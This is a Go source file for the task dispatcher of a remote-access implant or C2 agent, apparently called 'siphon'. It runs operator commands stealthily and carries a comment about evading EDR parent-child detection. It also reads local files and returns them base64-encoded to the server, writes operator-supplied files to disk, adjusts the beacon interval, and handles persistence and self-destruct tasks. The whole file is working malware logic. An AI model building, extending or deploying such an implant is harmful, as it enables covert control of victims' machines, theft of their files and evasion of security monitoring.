package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"siphon/shared"
)

// currentSleep holds the active beacon interval in nanoseconds; updated atomically by executeSleep.
var currentSleep atomic.Int64

// ExecuteTask dispatches the task to the appropriate handler.
func ExecuteTask(task *shared.Task) shared.TaskResult {
	switch task.Type {
	case "cmd":
		return executeCmdStealthy(task)
	case "upload":
		return executeUpload(task)
	case "download":
		return executeDownload(task)
	case "sleep":
		return executeSleep(task)
	case "persist":
		return executePersist(task)
	case "unpersist":
		return executeUnpersist(task)
	case "selfdestruct":
		result := executeSelfDestruct(task)
		// Send result before exiting so the operator sees confirmation.
		_ = SendResult(result)
		os.Exit(0)
		return result
	case "exit":
		os.Exit(0)
		return shared.TaskResult{}
	default:
		return shared.TaskResult{
			TaskID:  task.ID,
			Success: false,
			Output:  "unknown task type: " + task.Type,
		}
	}
}

// Note: executeCmd replaced by executeCmdStealthy in evasion_windows.go / evasion_other.go.
// Uses CreateProcess with CREATE_NO_WINDOW on Windows to avoid EDR parent-child detection.

// executeUpload reads a local file and returns its content (base64-encoded) to
// the server. If the file exceeds shared.ChunkSize the first chunk is returned;
// subsequent chunks would require a follow-up mechanism (v2 TODO).
func executeUpload(task *shared.Task) shared.TaskResult {
	fi, err := os.Stat(task.Args)
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("stat error: %v", err)}
	}

	f, err := os.Open(task.Args)
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("read error: %v", err)}
	}
	defer f.Close()

	readSize := fi.Size()
	truncated := false
	if readSize > int64(shared.ChunkSize) {
		readSize = int64(shared.ChunkSize)
		truncated = true
	}
	data, err := io.ReadAll(io.LimitReader(f, readSize))
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("read error: %v", err)}
	}

	resultType := "upload"
	if truncated {
		resultType = fmt.Sprintf("upload:truncated:%d", fi.Size())
	}

	return shared.TaskResult{
		TaskID:  task.ID,
		Success: true,
		Output:  base64.StdEncoding.EncodeToString(data),
		Type:    resultType,
	}
}

// executeDownload writes file data delivered by the server to a local path.
// task.Args format: "<base64-file-data>|<local-path>|<mode>"
// mode: "create" (truncate/create) or "append" (append chunk to existing file).
// For backwards compat, missing mode defaults to "create".
func executeDownload(task *shared.Task) shared.TaskResult {
	parts := strings.SplitN(task.Args, "|", 3)
	if len(parts) < 2 {
		return shared.TaskResult{
			TaskID:  task.ID,
			Success: false,
			Output:  "invalid args: expected base64data|local_path[|mode]",
		}
	}

	b64data, localPath := parts[0], parts[1]
	mode := "create"
	if len(parts) == 3 {
		mode = parts[2]
	}

	data, err := base64.StdEncoding.DecodeString(b64data)
	if err != nil {
		return shared.TaskResult{
			TaskID:  task.ID,
			Success: false,
			Output:  fmt.Sprintf("base64 decode error: %v", err),
		}
	}

	var flag int
	if mode == "append" {
		flag = os.O_WRONLY | os.O_CREATE | os.O_APPEND
	} else {
		flag = os.O_WRONLY | os.O_CREATE | os.O_TRUNC
	}

	f, err := os.OpenFile(localPath, flag, 0600)
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("open: %v", err)}
	}
	defer f.Close()
	n, err := f.Write(data)
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("write: %v", err)}
	}

	return shared.TaskResult{
		TaskID:  task.ID,
		Success: true,
		Output:  fmt.Sprintf("%s %d bytes to %s", mode, n, localPath),
	}
}

// executeSleep updates the global beacon interval.
// task.Args: integer seconds as a string.
func executeSleep(task *shared.Task) shared.TaskResult {
	n, err := strconv.Atoi(strings.TrimSpace(task.Args))
	if err != nil || n <= 0 {
		return shared.TaskResult{
			TaskID:  task.ID,
			Success: false,
			Output:  fmt.Sprintf("invalid sleep interval: %q", task.Args),
		}
	}
	const maxSleepSec = 86400
	if n > maxSleepSec {
		return shared.TaskResult{
			TaskID:  task.ID,
			Success: false,
			Output:  fmt.Sprintf("sleep %ds exceeds max %ds (24h)", n, maxSleepSec),
		}
	}
	currentSleep.Store(int64(time.Duration(n) * time.Second))
	return shared.TaskResult{
		TaskID:  task.ID,
		Success: true,
		Output:  fmt.Sprintf("sleep interval updated to %ds", n),
	}
}
